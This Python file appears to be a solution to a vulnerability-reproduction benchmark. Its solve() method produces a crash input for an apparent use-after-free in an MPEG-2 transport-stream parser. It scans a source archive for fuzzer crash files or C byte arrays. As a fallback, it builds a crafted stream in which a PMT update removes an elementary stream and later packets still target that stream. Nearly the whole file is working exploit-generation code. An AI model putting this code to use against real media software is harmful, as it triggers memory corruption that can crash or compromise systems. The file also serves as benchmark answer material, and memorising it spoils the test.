import os
import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._extract_poc_file(src_path)
        if data is not None and len(data) > 0:
            return data

        data = self._extract_poc_from_c_array(src_path)
        if data is not None and len(data) > 0:
            return data

        return self._fallback_ts_poc()

    def _extract_poc_file(self, src_path: str):
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        text_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
            ".inl", ".ipp", ".py", ".md", ".txt", ".rst", ".json", ".xml",
            ".yml", ".yaml", ".html", ".htm", ".cmake", ".ac", ".am",
            ".m4", ".sh", ".java", ".gradle", ".properties"
        }

        best_member = None
        best_score = -1
        best_closeness = None

        try:
            for m in tf.getmembers():
                if not m.isfile():
                    continue

                size = m.size
                if size <= 0 or size > 1_000_000:
                    continue

                name_lower = m.name.lower()
                base = os.path.basename(name_lower)
                _, ext = os.path.splitext(base)

                if ext in text_exts or base in {"makefile", "cmakelists.txt"}:
                    continue
                if base.startswith("readme") or base.startswith("license"):
                    continue

                closeness = abs(size - 1128)

                score = max(0, 1000 - closeness)

                if "372994344" in base:
                    score += 2000
                if "poc" in base:
                    score += 800
                if "crash" in base or "repro" in base:
                    score += 500
                if "m2ts" in base or base.endswith(".ts") or "ts" == ext:
                    score += 500
                if "mpeg" in base:
                    score += 300
                if "uaf" in base or "heap" in base:
                    score += 300
                for kw in ("fuzz", "oss-fuzz", "ossfuzz", "clusterfuzz", "corpus", "seed", "test"):
                    if kw in name_lower:
                        score += 200

                if score > best_score or (score == best_score and (best_closeness is None or closeness < best_closeness)):
                    best_score = score
                    best_member = m
                    best_closeness = closeness
        finally:
            pass

        if best_member is not None and best_score > 0:
            try:
                f = tf.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if data:
                        tf.close()
                        return data
            except Exception:
                tf.close()
                return None

        tf.close()
        return None

    def _extract_poc_from_c_array(self, src_path: str):
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        pattern = re.compile(
            r'(?:static\s+)?(?:const\s+)?'
            r'(?:unsigned\s+char|uint8_t|char|unsigned\s+int|unsigned\s+short)'
            r'\s+[A-Za-z0-9_]*\s*(?:\[[^\]]*\])?\s*=\s*{([^}]+)}',
            re.S
        )

        best_candidate = None
        best_score = -1
        best_closeness = None

        try:
            for m in tf.getmembers():
                if not m.isfile():
                    continue

                name_lower = m.name.lower()
                base = os.path.basename(name_lower)
                _, ext = os.path.splitext(base)
                if ext not in {".c", ".cc", ".cpp", ".h", ".hpp"}:
                    continue

                if m.size > 512_000:
                    continue

                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    content = f.read().decode("latin1", errors="ignore")
                except Exception:
                    continue

                relevance = 0
                for kw in ("372994344", "m2ts", "ts", "mpeg", "gf_m2ts_es_del", "uaf", "poc", "crash", "fuzz"):
                    if kw in name_lower:
                        relevance += 1

                for match in pattern.finditer(content):
                    arr_text = match.group(1)
                    tokens = re.findall(r'0x[0-9a-fA-F]+|\d+', arr_text)
                    if not tokens:
                        continue

                    values = []
                    for tok in tokens:
                        try:
                            if tok.lower().startswith("0x"):
                                v = int(tok, 16)
                            else:
                                v = int(tok, 10)
                            if v < 0:
                                continue
                            values.append(v & 0xFF)
                        except Exception:
                            continue

                    length = len(values)
                    if length < 16 or length > 100_000:
                        continue

                    ctx_start = max(0, match.start() - 200)
                    ctx_end = min(len(content), match.end() + 200)
                    ctx = (content[ctx_start:match.start()] + content[match.end():ctx_end]).lower()

                    ctx_score = 0
                    for kw in ("372994344", "poc", "repro", "crash", "bug", "uaf", "heap", "fuzz", "m2ts", "ts", "mpeg"):
                        if kw in ctx:
                            ctx_score += 10

                    ctx_score += relevance * 5

                    closeness = abs(length - 1128)
                    size_score = max(0, 500 - closeness)
                    total_score = ctx_score * 10 + size_score

                    if total_score > best_score or (total_score == best_score and (best_closeness is None or closeness < best_closeness)):
                        best_score = total_score
                        best_closeness = closeness
                        best_candidate = bytes(values)
        finally:
            tf.close()

        return best_candidate

    def _fallback_ts_poc(self) -> bytes:
        def crc32_mpeg2(data: bytes) -> int:
            crc = 0xFFFFFFFF
            for b in data:
                crc ^= b << 24
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
                    else:
                        crc = (crc << 1) & 0xFFFFFFFF
            return crc & 0xFFFFFFFF

        def build_pat_packet(pmt_pid: int, cc: int) -> bytes:
            tsid = 1
            version = 0
            current_next = 1
            section_number = 0
            last_section_number = 0
            program_number = 1

            rest = bytearray()
            rest.extend(struct.pack(">H", tsid))
            val = (3 << 6) | ((version & 0x1F) << 1) | (current_next & 0x01)
            rest.append(val)
            rest.append(section_number & 0xFF)
            rest.append(last_section_number & 0xFF)

            rest.extend(struct.pack(">H", program_number))
            prog_map_pid_field = 0xE000 | (pmt_pid & 0x1FFF)
            rest.extend(struct.pack(">H", prog_map_pid_field))

            section_length = len(rest) + 4
            header = bytearray(3)
            header[0] = 0x00
            header[1] = 0xB0 | ((section_length >> 8) & 0x0F)
            header[2] = section_length & 0xFF

            section_no_crc = header + rest
            crc = crc32_mpeg2(section_no_crc)
            section_bytes = section_no_crc + struct.pack(">I", crc)

            payload = bytearray()
            payload.append(0x00)
            payload.extend(section_bytes)
            while len(payload) < 184:
                payload.append(0xFF)

            pid = 0x0000
            b1 = 0x40 | ((pid >> 8) & 0x1F)
            b2 = pid & 0xFF
            b3 = 0x10 | (cc & 0x0F)

            packet = bytes([0x47, b1, b2, b3]) + bytes(payload)
            return packet

        def build_pmt_packet(pmt_pid: int, es_pids, version: int, cc: int) -> bytes:
            program_number = 1
            current_next = 1
            section_number = 0
            last_section_number = 0

            rest = bytearray()
            rest.extend(struct.pack(">H", program_number))
            val = (3 << 6) | ((version & 0x1F) << 1) | (current_next & 0x01)
            rest.append(val)
            rest.append(section_number & 0xFF)
            rest.append(last_section_number & 0xFF)

            pcr_pid = es_pids[0] if es_pids else 0x0101
            pcr_field = 0xE000 | (pcr_pid & 0x1FFF)
            rest.extend(struct.pack(">H", pcr_field))

            rest.extend(struct.pack(">H", 0xF000))

            for pid in es_pids:
                rest.append(0x1B)
                es_pid_field = 0xE000 | (pid & 0x1FFF)
                rest.extend(struct.pack(">H", es_pid_field))
                rest.extend(struct.pack(">H", 0xF000))

            section_length = len(rest) + 4
            header = bytearray(3)
            header[0] = 0x02
            header[1] = 0xB0 | ((section_length >> 8) & 0x0F)
            header[2] = section_length & 0xFF

            section_no_crc = header + rest
            crc = crc32_mpeg2(section_no_crc)
            section_bytes = section_no_crc + struct.pack(">I", crc)

            payload = bytearray()
            payload.append(0x00)
            payload.extend(section_bytes)
            while len(payload) < 184:
                payload.append(0xFF)

            pid = pmt_pid & 0x1FFF
            b1 = 0x40 | ((pid >> 8) & 0x1F)
            b2 = pid & 0xFF
            b3 = 0x10 | (cc & 0x0F)

            packet = bytes([0x47, b1, b2, b3]) + bytes(payload)
            return packet

        def build_pes_packet(pid: int, cc: int) -> bytes:
            pesh = bytearray()
            pesh.extend(b"\x00\x00\x01")
            pesh.append(0xE0)
            pesh.extend(struct.pack(">H", 0x0000))
            pesh.append(0x80)
            pesh.append(0x00)
            pesh.append(0x00)

            payload_len = 184 - len(pesh)
            if payload_len < 0:
                payload_len = 0
            payload_data = bytes([0xAB]) * payload_len
            payload = bytes(pesh) + payload_data

            b1 = 0x40 | ((pid >> 8) & 0x1F)
            b2 = pid & 0xFF
            b3 = 0x10 | (cc & 0x0F)

            packet = bytes([0x47, b1, b2, b3]) + payload
            return packet

        packets = []
        pmt_pid = 0x0100
        es_pid1 = 0x0101
        es_pid2 = 0x0102

        packets.append(build_pat_packet(pmt_pid=pmt_pid, cc=0))
        packets.append(build_pmt_packet(pmt_pid=pmt_pid, es_pids=[es_pid1, es_pid2], version=0, cc=0))
        packets.append(build_pes_packet(pid=es_pid2, cc=0))
        packets.append(build_pmt_packet(pmt_pid=pmt_pid, es_pids=[es_pid1], version=1, cc=1))
        packets.append(build_pes_packet(pid=es_pid2, cc=1))
        packets.append(build_pes_packet(pid=es_pid2, cc=2))

        poc = b"".join(packets)
        return poc